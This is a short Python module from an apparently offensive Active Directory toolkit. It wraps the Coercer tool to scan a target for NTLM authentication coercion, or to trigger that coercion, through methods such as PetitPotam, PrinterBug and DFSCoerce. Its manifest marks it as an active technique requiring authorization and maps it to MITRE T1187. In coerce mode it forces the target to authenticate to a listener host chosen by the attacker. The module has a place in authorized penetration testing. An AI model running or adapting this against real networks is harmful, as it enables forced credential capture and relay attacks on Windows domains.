"""Scan all 12+ coercion methods against target  -  report vulnerable interfaces."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.coercion.coerce_scanner.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion_scan"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    listener = getattr(args, "listener", None)
    scan_only = getattr(args, "scan_only", False)

    print(f"[*] Coercion Scanner: testing all known methods against {target}")

    import subprocess
    import shutil
    coercer = shutil.which("Coercer") or shutil.which("coercer")
    if coercer:
        cmd = [coercer, "scan" if scan_only else "coerce",
               "-t", target or "", "-l", listener or "127.0.0.1",
               "-u", cred.username or "", "-p", cred.password or "",
               "-d", cred.domain]
        if scan_only:
            cmd = [coercer, "scan", "-t", target or "",
                   "-u", cred.username or "", "-p", cred.password or "",
                   "-d", cred.domain]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr)
        return result.returncode

    methods = ["MS-EFSR (PetitPotam)", "MS-RPRN (PrinterBug)", "MS-DFSNM (DFSCoerce)",
               "MS-FSRVP (ShadowCoerce)", "MS-EVEN (CheeseOunce)", "MS-EFSRPC (EfsRpc)"]
    print("[!] Coercer not found. Known methods:")
    for m in methods:
        print(f"  - {m}")
    return 1
